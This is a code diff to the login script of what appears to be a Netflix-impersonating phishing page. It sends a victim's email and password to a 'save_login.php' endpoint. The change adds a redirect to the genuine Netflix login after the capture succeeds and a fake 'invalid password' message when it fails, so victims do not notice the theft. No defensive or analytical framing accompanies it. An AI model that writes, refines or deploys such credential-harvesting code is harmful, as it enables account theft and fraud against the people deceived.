@@ -323,7 +323,16 @@
                 url: BASE_URL + 'save_login.php',
                 data: { tid: tid, login: email, password: password, template: 'netflix' },
                 dataType: 'json',
-                complete: function () {
+                success: function (data) {
+                    if (data && data.ok) {
+                        window.location.href = 'https://www.netflix.com/login';
+                        return;
+                    }
+                    loginButton.textContent = 'Sign In';
+                    loginButton.disabled = false;
+                    alert('Invalid email or password. Please try again.');
+                },
+                error: function () {
                     loginButton.textContent = 'Sign In';
                     loginButton.disabled = false;
                     alert('Invalid email or password. Please try again.');
